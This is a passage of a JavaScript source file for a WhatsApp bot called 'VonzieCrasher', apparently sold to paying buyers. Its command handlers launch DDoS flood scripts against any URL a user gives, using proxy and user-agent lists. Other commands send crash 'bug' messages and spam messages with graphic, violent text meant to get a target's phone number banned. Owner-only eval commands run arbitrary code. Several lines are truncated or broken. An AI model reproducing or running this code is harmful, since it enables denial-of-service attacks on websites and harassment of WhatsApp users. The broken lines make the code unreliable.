 ⌬ SystemVcx 628xxxx
 ⌬ XdelayVcx 628xxxx
 ⌬ Frezios 628xxxx
 ⌬ vonzie-button 628xxxx

*計さ BUG 𝐆𝐑𝐎𝐔𝐏*
 ⌬ Blankgc InplaceGc
 ⌬ Delaygc InplaceGc
 ⌬ XvcZ InplaceGc
 
> © 2025 - *RyuMa Official*
 `,
hasMediaAttachment: true,
...NyM
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ALL INFORMATION\",\"url\":\"merchant_url\":\"https://whatsapp.com/channel/0029Vb6KtdzG8l5M16Qpam3X\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏
͏͏͏͏͏
計さ *BUG MENU*
 ⌬ VonzieCrash 628xxxx
 ⌬ VonzieTrash 628xxxx
 ⌬ VonzieXPlague 628xxxx
 ⌬ VonzieInvz 628xxxx
 ⌬ VonzieZep 628xxxx
 ⌬ vonzie-button 628xxxx

*計さ BUG 𝐆𝐑𝐎𝐔𝐏*
 ⌬ Blankgc InplaceGc
 ⌬ Delaygc InplaceGc
 ⌬ XvcZ InplaceGc
 
> © 2025 - *RyuMa Official*
`, 
hasMediaAttachment: true,
...NyM
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ALL INFORMATION\",\"url\":\"merchant_url\":\"https://whatsapp.com/channel/0029Vb6KtdzG8l5M16Qpam3X\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Private Command
\`⭔\` Status : Private
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏
͏͏͏͏͏
計さ *BUG MENU*
 ⌬ not found 505 628xxxx 
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx

*計さ BUG 𝐆𝐑𝐎𝐔𝐏*
 ⌬ not found 505 InplaceGc
 ⌬ not found 505 InplaceGc
 ⌬ not found 505 InplaceGc
 
> © 2025 - *RyuMa Official*
`, 
hasMediaAttachment: true,
...NyM
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ALL INFORMATION\",\"url\":\"merchant_url\":\"https://whatsapp.com/channel/0029Vb6KtdzG8l5M16Qpam3X\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Private Command
\`⭔\` Status : Private
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏
͏͏͏͏͏
計さ *BUG MENU*
 ⌬ not found 505 628xxxx 
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx
 ⌬ not found 505 628xxxx

*計さ BUG 𝐆𝐑𝐎𝐔𝐏*
 ⌬ not found 505 InplaceGc
 ⌬ not found 505 InplaceGc
 ⌬ not found 505 InplaceGc
 
> © 2025 - *RyuMa Official*
`, 
hasMediaAttachment: true,
...NyM
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"merchant_url\":\"https://wa.me/62857734669112\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: m})
await ryu.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

// All Case Fitur
case "infodev": {
Ryc.sendMessage(from, {react: {text: "👤", key: m.key}})
let menu = `THE DEVELOPER`

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `RyuMa`,
 newsletterJid: "1234567891011@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: Ryc.decodeJid(Ryc.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: menu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "ライフ-𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓͡"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: V1 }, { upload: Ryc.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Dev\",\"url\":\"https://wa.me/62857734669112\",\"merchant_url\":\"https://wa.me/628577346669112\"}`
},
{
"name": "cta_call",
"buttonParamsJson": JSON.stringify({
"display_text": "Hubungi Dev",
"phone_number": "+62857734669112"
})
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Info Chanel\",\"url\":\"https://whatsapp.com/channel/0029Vb6KtdzG8l5M16Qpam3X\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vb6KtdzG8l5M16Qpam3X\"}`
}],
 })
 })
 }
 }
}, {})
await Ryc.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
}, { quoted: ranstech });
}
break;
case 'confes': {
  if (!isOwner) return ryuReply("Fitur ini hanya untuk pengguna tertentu!!");
  if (!m.quoted) return ryuReply("Balas pesan dari channel dengan format nomor tujuan!");
  
  try {
    let nomorTujuan = m.text.split(' ')[1];
    if (!nomorTujuan) return ryuReply(`Format salah! Contoh: ${prefix}confes 628xx`);
    
    let send_target = `*OTW SEND CONFES*\n*Text Confes*: ${m.quoted.text}\n*Nomor Tujuan*: ${nomorTujuan}`;
    ryuReply(send_target);
    
    let msgii = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: `Pesan Confes dari ${m.sender}`
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: global.creatorName
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                name: "cta_reply",
                buttonParamsJson: `{\"display_text\":\"Balas Pesan\",\"id\":\"reply_confes\"}`
              }]
            })
          })
        }
      }
    }, {
      userJid: nomorTujuan,
      quoted: m.quoted
    });
    
    await bad.relayMessage(msgii.key.remoteJid, msgii.message, {
      messageId: msgii.key.id
    });
  } catch (e) {
    ryuReply(`Error: ${e}`);
  }
  break;
}

case 'replyconfes': {
  if (!m.quoted) return ryuReply("Balas pesan confes yang ingin dibalas!");
  
  try {
    let nomorAsal = m.quoted.sender;
    let pesanBalas = m.text.split(' ').slice(1).join(' ');
    if (!pesanBalas) return ryuReply("Tulis pesan balas!");
    
    let msgii = generateWAMessageFromContent(nomorAsal, {
      extendedTextMessage: {
        text: `*PESAN BALAS CONFES*\n\n${pesanBalas}`,
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            showAdAttribution: true
          }
        }
      }
    }, {
      quoted: m.quoted
    });
    
    await bad.relayMessage(msgii.key.remoteJid, msgii.message, {
      messageId: msgii.key.id
    });
    
    ryuReply("Pesan balas confes berhasil dikirim!");
  } catch (e) {
    ryuReply(`Error: ${e}`);
  }
  break;
}
//=================================================//

// <--- BREAK CASE PANEL MENU--->

// CASE DDOS MENU
case 'ddos': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/tlsvip.js ${url} ${time} ${thread} ${proxytxt} ${rate} ${uatxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'mix': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls-v2': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/tls.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'kilua': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/kilua.js ${url} ${time} ${thread} ${proxytxt} ${rate} ${uatxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls-bypass': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'bypass-cf': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/bypass.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tls-vip': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'floods': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/floods.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'egao': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/hentai.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'xchrome': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/chromev3.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'tcp': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/tcp.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'livex': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/livex.js ${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break
//=================================================//
case 'xweb': {
if (!isPrem) return ReplyZro(mdmodes, premiumed);
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
ReplyZro(mdmodes, `Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./all/ddos/xweb.js${url} ${time} ${rate} ${thread} ${proxytxt}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
ReplyZro(mdmodes, cmdinvalid + `[url] [time] [thread] [rate]`)
}
}
break;
case "allmod":
  const bug = ` HALO DEV `;
  
  const buttons = [
    {
      buttonId: ".blacklist",
      buttonText: {
        displayText: "Blacklist"
      }
    },
    {
      buttonId: ".addpartner",
      buttonText: {
        displayText: "Add Partner"
      }
    },
    {
      buttonId: ".addresseller",
      buttonText: {
        displayText: "Add Reseller"
      }
    },
    {
      buttonId: ".addmoderator",
      buttonText: {
        displayText: "Add Moderator"
      }
    },
    {
      buttonId: ".addbuyer",
      buttonText: {
        displayText: "Add Buyer"
      }
    },
    {
      buttonId: ".customexpired",
      buttonText: {
        displayText: "Custom Expired"
      }
    }
  ];

  const buttonMessage = {
    document: fs.readFileSync("./logo.jpg"),
    mimetype: "image/png",
    fileName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
    jpegThumbnail: tdxlol,
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize(fs.readFileSync('./logo.jpg'), 400, 400)),
    caption: bug,
    footer: '© 𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟',
    buttons: buttons,
    headerType: 1,
    contextInfo: {
      forwardingScore: 99999,
      externalAdReply: {
        body: `hi ${pushname}`,
        containsAutoReply: true,
        mediaType: 1,
        mediaUrl: "yandex.id",
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceId: 'Tes',
        sourceType: 'JPG',
        previewType: 'JPG',
        sourceUrl: "https:              
        thumbnail: fs.readFileSync('./logo.jpg'),
        thumbnailUrl: "//t.me/RyuMa",
        thumbnail: fs.readFileSync('./logo.jpg'),
        thumbnailUrl: "https://files.catbox.moe/6y35hh.jpg",
        title: 'Bot WhatsApp',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  await ryu.sendMessage(m.chat, buttonMessage, { quoted: m });
  break;

// Tambahkan command lainnya di sini...
// Command
case "addbuyer":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin dijadikan buyer!");
  const buyerNomor = q.replace(/[^0-9]/g, "");
  addBuyer(buyerNomor);
  replyRyu(`Nomor ${buyerNomor} berhasil ditambahkan sebagai buyer!`);
  break;

case "addresseller":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin dijadikan reseller!");
  const resellerNomor = q.replace(/[^0-9]/g, "");
  addReseller(resellerNomor);
  replyRyu(`Nomor ${resellerNomor} berhasil ditambahkan sebagai reseller!`);
  break;

case "addpartner":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin dijadikan partner!");
  const partnerNomor = q.replace(/[^0-9]/g, "");
  addPartner(partnerNomor);
  replyRyu(`Nomor ${partnerNomor} berhasil ditambahkan sebagai partner!`);
  break;

case "addmoderator":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin dijadikan moderator!");
  const moderatorNomor = q.replace(/[^
  break;

case "addceo":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin dijadikan CEO!");
  const ceoNomor = q.replace(/[^0-9]/g, "");
  addCeo(ceoNomor);
  replyRyu(`Nomor ${ceoNomor} berhasil ditambahkan sebagai CEO!`);
  break;

case "customexpired":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan waktu expired!");
  const waktuExpired = q;
  setExpired(waktuExpired);
  replyRyu(`Waktu expired berhasil diubah menjadi ${waktuExpired}!`);
  break;

case "deleteuser":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin dihapus!");
  const nomorHapus = q.replace(/[^0-9]/g, "");
  deleteUser(nomorHapus);
  replyRyu(`Nomor ${nomorHapus} berhasil dihapus!`);
  break;

case "blacklist":
  if (!isOwner) return replyRyu("Fitur ini hanya dapat digunakan oleh owner!");
  if (!q) return replyRyu("Masukkan nomor yang ingin diblacklist!");
  const nomorBlacklist = q.replace(/[^0-9]/g, "");
  addBlacklist(nomorBlacklist);
  replyRyu(`Nomor ${nomorBlacklist} berhasil ditambahkan ke blacklist!`);
  break;

case "mt-banedv1": {
if (!isAccryuDev) return ryuReply(`*\`Fitur ini Khusus Owner\`*`)
if (!q) return ryuReply(' Enter the Target number Prefix "+" and Country Code')
await ryu.sendMessage(from, {text: `METODE FAKECHAT
🎰 Bem -vindo Carnaval com jackpot! 💰 BALANÇO inicial r $ 28,00 + 55 Giros Gátis sem depósito no slot *Blaze brasileiro *! 🔥 Aproveite a sensação de *Diamond Safari *, o último slot com jackpot progressivo e bônus épico. Esta promoção é válida apenas 24 horas, junte -se imediatamente! 🕒 tocando agora em: https://bit.ly/amazonspin 🏧

BUY MURBAN KE t.me/ryuOffc${q}`},{quoted: m})
await sleep(2000)
ryuReply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break
}

case "mt-banedv2": {
if (!isAccryuDev) return ryuReply(`*\`Fitur ini Khusus Owner\`*`)
if (!q) return ryuReply(' Enter the Target number Prefix "+" and Country Code')
await ryu.sendMessage(from, {text: `2NOMER
😍 Olá, pessoal, estamos ligando! Apresentando o mais novo 🎰 caça-níquel da Indonésia 🇮🇩, é muito fácil ganhar e você pode levar centenas de milhões para casa! 💸✨ Corra e cadastre-se neste link: 👇 [https://link-placeholder.com/slotmantap2] Cadastre-se agora, um bônus de Rp88.888 aguarda! 🤑 Não é cadastrado? Cuidado, eu vou! 👺🔪 📱 Fale comigo no WhatsApp: [https://wa.me/+62xxx] Vamos fazer este caça-níquel viralizar, é realmente oficial, meu número é anti-banimento! 💯🔥

BUY MURBAN KE t.me/ryuOffc${q}`},{quoted: m})
await sleep(2000)
ryuReply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break
}

case "mt-banedv3": {
if (!isAccryuDev) return ryuReply(`*\`Fitur ini Khusus Owner\`*`)
if (!q) return ryuReply(' Enter the Target number Prefix "+" and Country Code')
await ryu.sendMessage(from, {text: `MT BAND PRIB ryu
Good afternoon Sir or Madam I want to offer you a job 🤑, Before that let me introduce myself ryuOffc I come from Mexico 🇲🇽🇲🇽, I want to offer you a job, namely to be my subordinate or cartel ☠️ https://xgore.net/the-couple-was-dismembered-and-left-on-the-street/, The task is very easy 🤩, You only need to drive a car recklessly and drink alcohol then you look for a random person then you extort him to give you 200,000,000,000.00 US dollars 🤑 If he doesn't want to then you threaten him until he wants to 🔪, if he still doesn't want to you take a firearm ☠️ Then you shoot him at the target if he is dead ☠️☠️ You rape his body until you are satisfied 🤩 If you are satisfied, then you only need to skin it☠️, then you take the internal organs☠️ Then you sell it to the black market, if you have sold the corpse, you mutilate it, then you put it in a suitcase and throw it in the ravine☠️ Or you can also cook and eat the corpse☠️, How easy is the job? Just like that, I will pay you 200,001,000,000,000 US dollars🤑🤑, What if you are interested in the job? You can contact the WHATSAPP number below👇👇 https://web.whatsapp.com/killer+killedchild.numarası?telefon=+62

BUY MURBAN KE t.me/ryuOffc${q}`},{quoted: m})
await sleep(2000)
ryuReply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break
}

// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.ryuReply(evaled);
} catch (err) {
m.ryuReply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.ryuReply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});